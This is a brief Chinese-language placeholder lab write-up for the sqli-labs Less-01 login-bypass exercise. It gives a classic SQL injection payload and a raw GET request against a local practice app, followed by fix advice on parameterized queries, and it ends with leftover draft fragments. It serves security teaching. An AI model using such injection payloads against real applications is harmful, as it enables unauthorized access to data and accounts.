---
title: LESS-01 登录绕过
---

# LESS-01 登录绕过（占位示例）

**目标**：演示登录输入点的 SQL 注入复现与修复建议（占位内容）。

## 简短复现步骤（占位）
1. 访问：`http://127.0.0.1/sqlilabs/Less-01/?id=1`
2. Payload 示例（占位）：`' OR '1'='1' --+`

## PoC（占位）
GET /sqlilabs/Less-01/?id=1' OR '1'='1' --+ HTTP/1.1
Host: 127.0.0.1

## 修复建议
- 使用参数化查询（Prepared Statements）
- 最小化数据库错误输出

![示例截图](../assets/image/1.png)

![示例截图](assets/image/1.png)

/sqlilabs-report/assets/image/1.png

添加了吗？
